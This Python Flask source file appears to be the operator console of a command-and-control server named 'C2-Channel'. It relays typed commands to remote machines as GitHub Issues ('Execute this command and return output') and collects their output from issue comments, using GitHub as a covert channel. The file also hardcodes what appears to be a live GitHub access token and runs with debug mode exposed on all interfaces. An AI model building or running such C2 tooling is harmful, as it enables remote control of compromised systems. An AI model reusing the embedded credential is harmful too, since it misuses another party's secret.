from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import requests
import time

app = Flask(__name__)
CORS(app)

# GitHub settings
GITHUB_TOKEN = "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"
GITHUB_REPO = "CaptShiva007/C2-Channel"

HEADERS = {
    "Authorization": f"token {GITHUB_TOKEN}",
    "Accept": "application/vnd.github.v3+json"
}

# Stores issued commands and their responses
command_history = []

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json()
    command = data.get("message", "").strip()

    if not command:
        return jsonify({"error": "No command received"}), 400

    if command == "clear_terminal":  # Custom clear command (won't be sent to GitHub)
        command_history.clear()
        return jsonify({"success": "Terminal cleared"}), 200

    # Create a GitHub Issue for the command
    issue_data = {
        "title": f"Command: {command}",
        "body": "Execute this command and return output.",
        "labels": ["command"]
    }
    response = requests.post(
        f"https://api.github.com/repos/{GITHUB_REPO}/issues",
        json=issue_data,
        headers=HEADERS
    )

    if response.status_code == 201:
        issue_number = response.json().get("number")
        command_history.append({
            "command": command,
            "output": "Waiting for response...",
            "issue_number": issue_number
        })
        return jsonify({"success": "Command submitted"}), 200
    else:
        return jsonify({"error": "Failed to create GitHub issue", "details": response.text}), 500

@app.route('/history', methods=['GET'])
def history():
    updated_history = []

    for entry in command_history:
        issue_number = entry["issue_number"]
        command = entry["command"]
        response_text = entry["output"]

        if response_text == "Waiting for response...":
            comments_url = f"https://api.github.com/repos/{GITHUB_REPO}/issues/{issue_number}/comments"
            comments_response = requests.get(comments_url, headers=HEADERS)

            if comments_response.status_code == 200:
                comments = comments_response.json()
                if comments:
                    latest_comment = comments[-1]["body"].strip()
                    cleaned_output = latest_comment.replace("```", "").strip()  # Remove Markdown formatting
                    response_text = cleaned_output

        updated_history.append({
            "command": command,
            "output": response_text
        })

    return jsonify(updated_history)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
